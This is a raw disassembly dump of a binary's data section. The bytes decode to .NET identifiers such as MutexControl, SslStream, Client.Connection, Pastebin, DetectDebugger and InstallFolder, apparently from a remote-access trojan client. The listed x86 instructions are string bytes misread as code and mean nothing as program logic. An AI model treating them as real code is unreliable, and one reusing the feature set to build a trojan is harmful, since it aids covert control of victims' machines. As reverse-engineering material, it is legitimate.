  408753:	64 6c                	fs insb (%dx),%es:(%edi)
  408755:	6c                   	insb   (%dx),%es:(%edi)
  408756:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408759:	6c                   	insb   (%dx),%es:(%edi)
  40875a:	00 4b 69             	add    %cl,0x69(%ebx)
  40875d:	6c                   	insb   (%dx),%es:(%edi)
  40875e:	6c                   	insb   (%dx),%es:(%edi)
  40875f:	00 50 6f             	add    %dl,0x6f(%eax)
  408762:	6c                   	insb   (%dx),%es:(%edi)
  408763:	6c                   	insb   (%dx),%es:(%edi)
  408764:	00 57 72             	add    %dl,0x72(%edi)
  408767:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  40876e:	00 
  40876f:	53                   	push   %ebx
  408770:	65 74 41             	gs je  0x4087b4
  408773:	73 4e                	jae    0x4087c3
  408775:	75 6c                	jne    0x4087e3
  408777:	6c                   	insb   (%dx),%es:(%edi)
  408778:	00 4d 75             	add    %cl,0x75(%ebp)
  40877b:	74 65                	je     0x4087e2
  40877d:	78 43                	js     0x4087c2
  40877f:	6f                   	outsl  %ds:(%esi),(%dx)
  408780:	6e                   	outsb  %ds:(%esi),(%dx)
  408781:	74 72                	je     0x4087f5
  408783:	6f                   	outsl  %ds:(%esi),(%dx)
  408784:	6c                   	insb   (%dx),%es:(%edi)
  408785:	00 45 6e             	add    %al,0x6e(%ebp)
  408788:	63 6f 64             	arpl   %ebp,0x64(%edi)
  40878b:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  40878f:	72 65                	jb     0x4087f6
  408791:	61                   	popa
  408792:	6d                   	insl   (%dx),%es:(%edi)
  408793:	00 46 69             	add    %al,0x69(%esi)
  408796:	6c                   	insb   (%dx),%es:(%edi)
  408797:	65 53                	gs push %ebx
  408799:	74 72                	je     0x40880d
  40879b:	65 61                	gs popa
  40879d:	6d                   	insl   (%dx),%es:(%edi)
  40879e:	00 4e 65             	add    %cl,0x65(%esi)
  4087a1:	74 77                	je     0x40881a
  4087a3:	6f                   	outsl  %ds:(%esi),(%dx)
  4087a4:	72 6b                	jb     0x408811
  4087a6:	53                   	push   %ebx
  4087a7:	74 72                	je     0x40881b
  4087a9:	65 61                	gs popa
  4087ab:	6d                   	insl   (%dx),%es:(%edi)
  4087ac:	00 53 73             	add    %dl,0x73(%ebx)
  4087af:	6c                   	insb   (%dx),%es:(%edi)
  4087b0:	53                   	push   %ebx
  4087b1:	74 72                	je     0x408825
  4087b3:	65 61                	gs popa
  4087b5:	6d                   	insl   (%dx),%es:(%edi)
  4087b6:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4087ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4087bb:	64 65 46             	fs gs inc %esi
  4087be:	72 6f                	jb     0x40882f
  4087c0:	6d                   	insl   (%dx),%es:(%edi)
  4087c1:	53                   	push   %ebx
  4087c2:	74 72                	je     0x408836
  4087c4:	65 61                	gs popa
  4087c6:	6d                   	insl   (%dx),%es:(%edi)
  4087c7:	00 43 72             	add    %al,0x72(%ebx)
  4087ca:	79 70                	jns    0x40883c
  4087cc:	74 6f                	je     0x40883d
  4087ce:	53                   	push   %ebx
  4087cf:	74 72                	je     0x408843
  4087d1:	65 61                	gs popa
  4087d3:	6d                   	insl   (%dx),%es:(%edi)
  4087d4:	00 47 5a             	add    %al,0x5a(%edi)
  4087d7:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4087de:	6d                   	insl   (%dx),%es:(%edi)
  4087df:	00 4d 65             	add    %cl,0x65(%ebp)
  4087e2:	6d                   	insl   (%dx),%es:(%edi)
  4087e3:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e4:	72 79                	jb     0x40885f
  4087e6:	53                   	push   %ebx
  4087e7:	74 72                	je     0x40885b
  4087e9:	65 61                	gs popa
  4087eb:	6d                   	insl   (%dx),%es:(%edi)
  4087ec:	00 50 72             	add    %dl,0x72(%eax)
  4087ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4087f0:	67 72 61             	addr16 jb 0x408854
  4087f3:	6d                   	insl   (%dx),%es:(%edi)
  4087f4:	00 67 65             	add    %ah,0x65(%edi)
  4087f7:	74 5f                	je     0x408858
  4087f9:	49                   	dec    %ecx
  4087fa:	74 65                	je     0x408861
  4087fc:	6d                   	insl   (%dx),%es:(%edi)
  4087fd:	00 67 65             	add    %ah,0x65(%edi)
  408800:	74 5f                	je     0x408861
  408802:	49                   	dec    %ecx
  408803:	73 36                	jae    0x40883b
  408805:	34 42                	xor    $0x42,%al
  408807:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  40880e:	74 
  40880f:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  408816:	65 6d                	gs insl (%dx),%es:(%edi)
  408818:	00 43 6c             	add    %al,0x6c(%ebx)
  40881b:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  408822:	67 6f                	outsl  %ds:(%si),(%dx)
  408824:	72 69                	jb     0x40888f
  408826:	74 68                	je     0x408890
  408828:	6d                   	insl   (%dx),%es:(%edi)
  408829:	00 53 79             	add    %dl,0x79(%ebx)
  40882c:	6d                   	insl   (%dx),%es:(%edi)
  40882d:	6d                   	insl   (%dx),%es:(%edi)
  40882e:	65 74 72             	gs je  0x4088a3
  408831:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408838:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  40883f:	79 
  408840:	6d                   	insl   (%dx),%es:(%edi)
  408841:	6d                   	insl   (%dx),%es:(%edi)
  408842:	65 74 72             	gs je  0x4088b7
  408845:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  40884c:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  408853:	73 
  408854:	68 41 6c 67 6f       	push   $0x6f676c41
  408859:	72 69                	jb     0x4088c4
  40885b:	74 68                	je     0x4088c5
  40885d:	6d                   	insl   (%dx),%es:(%edi)
  40885e:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  408862:	6d                   	insl   (%dx),%es:(%edi)
  408863:	00 52 61             	add    %dl,0x61(%edx)
  408866:	6e                   	outsb  %ds:(%esi),(%dx)
  408867:	64 6f                	outsl  %fs:(%esi),(%dx)
  408869:	6d                   	insl   (%dx),%es:(%edi)
  40886a:	00 49 43             	add    %cl,0x43(%ecx)
  40886d:	72 79                	jb     0x4088e8
  40886f:	70 74                	jo     0x4088e5
  408871:	6f                   	outsl  %ds:(%esi),(%dx)
  408872:	54                   	push   %esp
  408873:	72 61                	jb     0x4088d6
  408875:	6e                   	outsb  %ds:(%esi),(%dx)
  408876:	73 66                	jae    0x4088de
  408878:	6f                   	outsl  %ds:(%esi),(%dx)
  408879:	72 6d                	jb     0x4088e8
  40887b:	00 4d 73             	add    %cl,0x73(%ebp)
  40887e:	67 50                	addr16 push %eax
  408880:	61                   	popa
  408881:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  408884:	6e                   	outsb  %ds:(%esi),(%dx)
  408885:	75 6d                	jne    0x4088f4
  408887:	00 57 72             	add    %dl,0x72(%edi)
  40888a:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  408891:	65 
  408892:	61                   	popa
  408893:	6e                   	outsb  %ds:(%esi),(%dx)
  408894:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  408898:	6f                   	outsl  %ds:(%esi),(%dx)
  408899:	6f                   	outsl  %ds:(%esi),(%dx)
  40889a:	6c                   	insb   (%dx),%es:(%edi)
  40889b:	65 61                	gs popa
  40889d:	6e                   	outsb  %ds:(%esi),(%dx)
  40889e:	00 53 65             	add    %dl,0x65(%ebx)
  4088a1:	74 41                	je     0x4088e4
  4088a3:	73 42                	jae    0x4088e7
  4088a5:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4088a7:	6c                   	insb   (%dx),%es:(%edi)
  4088a8:	65 61                	gs popa
  4088aa:	6e                   	outsb  %ds:(%esi),(%dx)
  4088ab:	00 48 77             	add    %cl,0x77(%eax)
  4088ae:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  4088b5:	65 
  4088b6:	6e                   	outsb  %ds:(%esi),(%dx)
  4088b7:	00 63 68             	add    %ah,0x68(%ebx)
  4088ba:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  4088c1:	4d 
  4088c2:	61                   	popa
  4088c3:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4088ca:	43                   	inc    %ebx
  4088cb:	68 61 69 6e 00       	push   $0x6e6961
  4088d0:	63 68 61             	arpl   %ebp,0x61(%eax)
  4088d3:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4088da:	6f                   	outsl  %ds:(%esi),(%dx)
  4088db:	6d                   	insl   (%dx),%es:(%edi)
  4088dc:	61                   	popa
  4088dd:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088e4:	43                   	inc    %ebx
  4088e5:	75 72                	jne    0x408959
  4088e7:	72 65                	jb     0x40894e
  4088e9:	6e                   	outsb  %ds:(%esi),(%dx)
  4088ea:	74 44                	je     0x408930
  4088ec:	6f                   	outsl  %ds:(%esi),(%dx)
  4088ed:	6d                   	insl   (%dx),%es:(%edi)
  4088ee:	61                   	popa
  4088ef:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4088f6:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  4088fa:	00 49 73             	add    %cl,0x73(%ecx)
  4088fd:	41                   	inc    %ecx
  4088fe:	64 6d                	fs insl (%dx),%es:(%edi)
  408900:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  408907:	00 47 65             	add    %al,0x65(%edi)
  40890a:	74 46                	je     0x408952
  40890c:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  408913:	57 
  408914:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  40891b:	78 
  40891c:	74 65                	je     0x408983
  40891e:	6e                   	outsb  %ds:(%esi),(%dx)
  40891f:	73 69                	jae    0x40898a
  408921:	6f                   	outsl  %ds:(%esi),(%dx)
  408922:	6e                   	outsb  %ds:(%esi),(%dx)
  408923:	00 67 65             	add    %ah,0x65(%edi)
  408926:	74 5f                	je     0x408987
  408928:	4f                   	dec    %edi
  408929:	53                   	push   %ebx
  40892a:	56                   	push   %esi
  40892b:	65 72 73             	gs jb  0x4089a1
  40892e:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408935:	74 65                	je     0x40899c
  408937:	6d                   	insl   (%dx),%es:(%edi)
  408938:	2e 49                	cs dec %ecx
  40893a:	4f                   	dec    %edi
  40893b:	2e 43                	cs inc %ebx
  40893d:	6f                   	outsl  %ds:(%esi),(%dx)
  40893e:	6d                   	insl   (%dx),%es:(%edi)
  40893f:	70 72                	jo     0x4089b3
  408941:	65 73 73             	gs jae 0x4089b7
  408944:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  40894b:	6c                   	insb   (%dx),%es:(%edi)
  40894c:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  408953:	00 53 79             	add    %dl,0x79(%ebx)
  408956:	73 74                	jae    0x4089cc
  408958:	65 6d                	gs insl (%dx),%es:(%edi)
  40895a:	2e 53                	cs push %ebx
  40895c:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408960:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  408967:	68 
  408968:	65 6e                	outsb  %gs:(%esi),(%dx)
  40896a:	74 69                	je     0x4089d5
  40896c:	63 61 74             	arpl   %esp,0x74(%ecx)
  40896f:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  408976:	74 65                	je     0x4089dd
  408978:	6d                   	insl   (%dx),%es:(%edi)
  408979:	2e 52                	cs push %edx
  40897b:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  40897e:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408983:	6e                   	outsb  %ds:(%esi),(%dx)
  408984:	00 58 35             	add    %bl,0x35(%eax)
  408987:	30 39                	xor    %bh,(%ecx)
  408989:	43                   	inc    %ebx
  40898a:	65 72 74             	gs jb  0x408a01
  40898d:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408994:	43                   	inc    %ebx
  408995:	6f                   	outsl  %ds:(%esi),(%dx)
  408996:	6c                   	insb   (%dx),%es:(%edi)
  408997:	6c                   	insb   (%dx),%es:(%edi)
  408998:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40899d:	6e                   	outsb  %ds:(%esi),(%dx)
  40899e:	00 4d 61             	add    %cl,0x61(%ebp)
  4089a1:	6e                   	outsb  %ds:(%esi),(%dx)
  4089a2:	61                   	popa
  4089a3:	67 65 6d             	gs insl (%dx),%es:(%di)
  4089a6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089a8:	74 4f                	je     0x4089f9
  4089aa:	62 6a 65             	bound  %ebp,0x65(%edx)
  4089ad:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4089b1:	6c                   	insb   (%dx),%es:(%edi)
  4089b2:	6c                   	insb   (%dx),%es:(%edi)
  4089b3:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089b8:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b9:	00 43 6c             	add    %al,0x6c(%ebx)
  4089bc:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  4089c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c4:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c5:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089ca:	6e                   	outsb  %ds:(%esi),(%dx)
  4089cb:	00 73 65             	add    %dh,0x65(%ebx)
  4089ce:	74 5f                	je     0x408a2f
  4089d0:	50                   	push   %eax
  4089d1:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d2:	73 69                	jae    0x408a3d
  4089d4:	74 69                	je     0x408a3f
  4089d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d7:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d8:	00 70 6f             	add    %dh,0x6f(%eax)
  4089db:	73 69                	jae    0x408a46
  4089dd:	74 69                	je     0x408a48
  4089df:	6f                   	outsl  %ds:(%esi),(%dx)
  4089e0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089e1:	00 43 72             	add    %al,0x72(%ebx)
  4089e4:	79 70                	jns    0x408a56
  4089e6:	74 6f                	je     0x408a57
  4089e8:	67 72 61             	addr16 jb 0x408a4c
  4089eb:	70 68                	jo     0x408a55
  4089ed:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4089f4:	74 69                	je     0x408a5f
  4089f6:	6f                   	outsl  %ds:(%esi),(%dx)
  4089f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4089f8:	00 41 72             	add    %al,0x72(%ecx)
  4089fb:	67 75 6d             	addr16 jne 0x408a6b
  4089fe:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a00:	74 4e                	je     0x408a50
  408a02:	75 6c                	jne    0x408a70
  408a04:	6c                   	insb   (%dx),%es:(%edi)
  408a05:	45                   	inc    %ebp
  408a06:	78 63                	js     0x408a6b
  408a08:	65 70 74             	gs jo  0x408a7f
  408a0b:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408a12:	75 6d                	jne    0x408a81
  408a14:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a16:	74 45                	je     0x408a5d
  408a18:	78 63                	js     0x408a7d
  408a1a:	65 70 74             	gs jo  0x408a91
  408a1d:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408a24:	6e                   	outsb  %ds:(%esi),(%dx)
  408a25:	6f                   	outsl  %ds:(%esi),(%dx)
  408a26:	77 6e                	ja     0x408a96
  408a28:	00 49 6d             	add    %cl,0x6d(%ecx)
  408a2b:	61                   	popa
  408a2c:	67 65 43             	addr16 gs inc %ebx
  408a2f:	6f                   	outsl  %ds:(%esi),(%dx)
  408a30:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408a35:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a37:	00 53 65             	add    %dl,0x65(%ebx)
  408a3a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3b:	64 49                	fs dec %ecx
  408a3d:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3e:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a40:	00 46 69             	add    %al,0x69(%esi)
  408a43:	6c                   	insb   (%dx),%es:(%edi)
  408a44:	65 49                	gs dec %ecx
  408a46:	6e                   	outsb  %ds:(%esi),(%dx)
  408a47:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a49:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408a4d:	76 65                	jbe    0x408ab4
  408a4f:	49                   	dec    %ecx
  408a50:	6e                   	outsb  %ds:(%esi),(%dx)
  408a51:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a53:	00 46 69             	add    %al,0x69(%esi)
  408a56:	6c                   	insb   (%dx),%es:(%edi)
  408a57:	65 53                	gs push %ebx
  408a59:	79 73                	jns    0x408ace
  408a5b:	74 65                	je     0x408ac2
  408a5d:	6d                   	insl   (%dx),%es:(%edi)
  408a5e:	49                   	dec    %ecx
  408a5f:	6e                   	outsb  %ds:(%esi),(%dx)
  408a60:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a62:	00 43 6f             	add    %al,0x6f(%ebx)
  408a65:	6d                   	insl   (%dx),%es:(%edi)
  408a66:	70 75                	jo     0x408add
  408a68:	74 65                	je     0x408acf
  408a6a:	72 49                	jb     0x408ab5
  408a6c:	6e                   	outsb  %ds:(%esi),(%dx)
  408a6d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a6f:	00 43 53             	add    %al,0x53(%ebx)
  408a72:	68 61 72 70 41       	push   $0x41707261
  408a77:	72 67                	jb     0x408ae0
  408a79:	75 6d                	jne    0x408ae8
  408a7b:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a7d:	74 49                	je     0x408ac8
  408a7f:	6e                   	outsb  %ds:(%esi),(%dx)
  408a80:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a82:	00 50 72             	add    %dl,0x72(%eax)
  408a85:	6f                   	outsl  %ds:(%esi),(%dx)
  408a86:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a89:	73 53                	jae    0x408ade
  408a8b:	74 61                	je     0x408aee
  408a8d:	72 74                	jb     0x408b03
  408a8f:	49                   	dec    %ecx
  408a90:	6e                   	outsb  %ds:(%esi),(%dx)
  408a91:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a93:	00 57 72             	add    %dl,0x72(%edi)
  408a96:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  408a9d:	50 
  408a9e:	72 65                	jb     0x408b05
  408aa0:	76 65                	jbe    0x408b07
  408aa2:	6e                   	outsb  %ds:(%esi),(%dx)
  408aa3:	74 53                	je     0x408af8
  408aa5:	6c                   	insb   (%dx),%es:(%edi)
  408aa6:	65 65 70 00          	gs gs jo 0x408aaa
  408aaa:	5a                   	pop    %edx
  408aab:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408ab2:	65 6e                	outsb  %gs:(%esi),(%dx)
  408ab4:	74 41                	je     0x408af7
  408ab6:	70 70                	jo     0x408b28
  408ab8:	00 4d 69             	add    %cl,0x69(%ebp)
  408abb:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408abe:	73 6f                	jae    0x408b2f
  408ac0:	66 74 2e             	data16 je 0x408af1
  408ac3:	43                   	inc    %ebx
  408ac4:	53                   	push   %ebx
  408ac5:	68 61 72 70 00       	push   $0x707261
  408aca:	47                   	inc    %edi
  408acb:	72 6f                	jb     0x408b3c
  408acd:	75 70                	jne    0x408b3f
  408acf:	00 4e 6f             	add    %cl,0x6f(%esi)
  408ad2:	72 6d                	jb     0x408b41
  408ad4:	61                   	popa
  408ad5:	6c                   	insb   (%dx),%es:(%edi)
  408ad6:	53                   	push   %ebx
  408ad7:	74 61                	je     0x408b3a
  408ad9:	72 74                	jb     0x408b4f
  408adb:	75 70                	jne    0x408b4d
  408add:	00 53 79             	add    %dl,0x79(%ebx)
  408ae0:	73 74                	jae    0x408b56
  408ae2:	65 6d                	gs insl (%dx),%es:(%edi)
  408ae4:	2e 4c                	cs dec %esp
  408ae6:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408aed:	61                   	popa
  408aee:	72 00                	jb     0x408af0
  408af0:	43                   	inc    %ebx
  408af1:	68 61 72 00 49       	push   $0x49007261
  408af6:	6e                   	outsb  %ds:(%esi),(%dx)
  408af7:	76 6f                	jbe    0x408b68
  408af9:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408afd:	6d                   	insl   (%dx),%es:(%edi)
  408afe:	62 65 72             	bound  %esp,0x72(%ebp)
  408b01:	00 4d 44             	add    %cl,0x44(%ebp)
  408b04:	35 43 72 79 70       	xor    $0x70797243,%eax
  408b09:	74 6f                	je     0x408b7a
  408b0b:	53                   	push   %ebx
  408b0c:	65 72 76             	gs jb  0x408b85
  408b0f:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b16:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408b1d:	41 
  408b1e:	43                   	inc    %ebx
  408b1f:	72 79                	jb     0x408b9a
  408b21:	70 74                	jo     0x408b97
  408b23:	6f                   	outsl  %ds:(%esi),(%dx)
  408b24:	53                   	push   %ebx
  408b25:	65 72 76             	gs jb  0x408b9e
  408b28:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b2f:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  408b36:	73 
  408b37:	43                   	inc    %ebx
  408b38:	72 79                	jb     0x408bb3
  408b3a:	70 74                	jo     0x408bb0
  408b3c:	6f                   	outsl  %ds:(%esi),(%dx)
  408b3d:	53                   	push   %ebx
  408b3e:	65 72 76             	gs jb  0x408bb7
  408b41:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b48:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  408b4f:	72 
  408b50:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b57:	64 65 72 00          	fs gs jb 0x408b5b
  408b5b:	49                   	dec    %ecx
  408b5c:	6e                   	outsb  %ds:(%esi),(%dx)
  408b5d:	73 74                	jae    0x408bd3
  408b5f:	61                   	popa
  408b60:	6c                   	insb   (%dx),%es:(%edi)
  408b61:	6c                   	insb   (%dx),%es:(%edi)
  408b62:	46                   	inc    %esi
  408b63:	6f                   	outsl  %ds:(%esi),(%dx)
  408b64:	6c                   	insb   (%dx),%es:(%edi)
  408b65:	64 65 72 00          	fs gs jb 0x408b69
  408b69:	49                   	dec    %ecx
  408b6a:	64 53                	fs push %ebx
  408b6c:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b6e:	64 65 72 00          	fs gs jb 0x408b72
  408b72:	73 65                	jae    0x408bd9
  408b74:	6e                   	outsb  %ds:(%esi),(%dx)
  408b75:	64 65 72 00          	fs gs jb 0x408b79
  408b79:	4d                   	dec    %ebp
  408b7a:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b81:	74 2e                	je     0x408bb1
  408b83:	43                   	inc    %ebx
  408b84:	53                   	push   %ebx
  408b85:	68 61 72 70 2e       	push   $0x2e707261
  408b8a:	52                   	push   %edx
  408b8b:	75 6e                	jne    0x408bfb
  408b8d:	74 69                	je     0x408bf8
  408b8f:	6d                   	insl   (%dx),%es:(%edi)
  408b90:	65 42                	gs inc %edx
  408b92:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408b99:	61                   	popa
  408b9a:	6c                   	insb   (%dx),%es:(%edi)
  408b9b:	6c                   	insb   (%dx),%es:(%edi)
  408b9c:	53                   	push   %ebx
  408b9d:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408ba4:	65 
  408ba5:	72 00                	jb     0x408ba7
  408ba7:	47                   	inc    %edi
  408ba8:	65 74 45             	gs je  0x408bf0
  408bab:	6e                   	outsb  %ds:(%esi),(%dx)
  408bac:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408baf:	65 72 00             	gs jb  0x408bb2
  408bb2:	67 65 74 5f          	addr16 gs je 0x408c15
  408bb6:	42                   	inc    %edx
  408bb7:	75 66                	jne    0x408c1f
  408bb9:	66 65 72 00          	data16 gs jb 0x408bbd
  408bbd:	73 65                	jae    0x408c24
  408bbf:	74 5f                	je     0x408c20
  408bc1:	42                   	inc    %edx
  408bc2:	75 66                	jne    0x408c2a
  408bc4:	66 65 72 00          	data16 gs jb 0x408bc8
  408bc8:	57                   	push   %edi
  408bc9:	72 69                	jb     0x408c34
  408bcb:	74 65                	je     0x408c32
  408bcd:	49                   	dec    %ecx
  408bce:	6e                   	outsb  %ds:(%esi),(%dx)
  408bcf:	74 65                	je     0x408c36
  408bd1:	67 65 72 00          	addr16 gs jb 0x408bd5
  408bd5:	67 65 74 5f          	addr16 gs je 0x408c38
  408bd9:	41                   	inc    %ecx
  408bda:	73 49                	jae    0x408c25
  408bdc:	6e                   	outsb  %ds:(%esi),(%dx)
  408bdd:	74 65                	je     0x408c44
  408bdf:	67 65 72 00          	addr16 gs jb 0x408be3
  408be3:	73 65                	jae    0x408c4a
  408be5:	74 5f                	je     0x408c46
  408be7:	41                   	inc    %ecx
  408be8:	73 49                	jae    0x408c33
  408bea:	6e                   	outsb  %ds:(%esi),(%dx)
  408beb:	74 65                	je     0x408c52
  408bed:	67 65 72 00          	addr16 gs jb 0x408bf1
  408bf1:	47                   	inc    %edi
  408bf2:	65 74 41             	gs je  0x408c36
  408bf5:	73 49                	jae    0x408c40
  408bf7:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf8:	74 65                	je     0x408c5f
  408bfa:	67 65 72 00          	addr16 gs jb 0x408bfe
  408bfe:	53                   	push   %ebx
  408bff:	65 74 41             	gs je  0x408c43
  408c02:	73 49                	jae    0x408c4d
  408c04:	6e                   	outsb  %ds:(%esi),(%dx)
  408c05:	74 65                	je     0x408c6c
  408c07:	67 65 72 00          	addr16 gs jb 0x408c0b
  408c0b:	44                   	inc    %esp
  408c0c:	65 74 65             	gs je  0x408c74
  408c0f:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408c13:	62 75 67             	bound  %esi,0x67(%ebp)
  408c16:	67 65 72 00          	addr16 gs jb 0x408c1a
  408c1a:	4d                   	dec    %ebp
  408c1b:	61                   	popa
  408c1c:	6e                   	outsb  %ds:(%esi),(%dx)
  408c1d:	61                   	popa
  408c1e:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c21:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c23:	74 4f                	je     0x408c74
  408c25:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c28:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408c2c:	61                   	popa
  408c2d:	72 63                	jb     0x408c92
  408c2f:	68 65 72 00 53       	push   $0x53007265
  408c34:	65 73 73             	gs jae 0x408caa
  408c37:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c3e:	6e                   	outsb  %ds:(%esi),(%dx)
  408c3f:	67 45                	addr16 inc %ebp
  408c41:	76 65                	jbe    0x408ca8
  408c43:	6e                   	outsb  %ds:(%esi),(%dx)
  408c44:	74 48                	je     0x408c8e
  408c46:	61                   	popa
  408c47:	6e                   	outsb  %ds:(%esi),(%dx)
  408c48:	64 6c                	fs insb (%dx),%es:(%edi)
  408c4a:	65 72 00             	gs jb  0x408c4d
  408c4d:	54                   	push   %esp
  408c4e:	69 6d 65 72 00 6f 77 	imul   $0x776f0072,0x65(%ebp),%ebp
  408c55:	6e                   	outsb  %ds:(%esi),(%dx)
  408c56:	65 72 00             	gs jb  0x408c59
  408c59:	43                   	inc    %ebx
  408c5a:	6c                   	insb   (%dx),%es:(%edi)
  408c5b:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  408c62:	6c                   	insb   (%dx),%es:(%edi)
  408c63:	70 65                	jo     0x408cca
  408c65:	72 00                	jb     0x408c67
  408c67:	54                   	push   %esp
  408c68:	6f                   	outsl  %ds:(%esi),(%dx)
  408c69:	55                   	push   %ebp
  408c6a:	70 70                	jo     0x408cdc
  408c6c:	65 72 00             	gs jb  0x408c6f
  408c6f:	44                   	inc    %esp
  408c70:	65 74 65             	gs je  0x408cd8
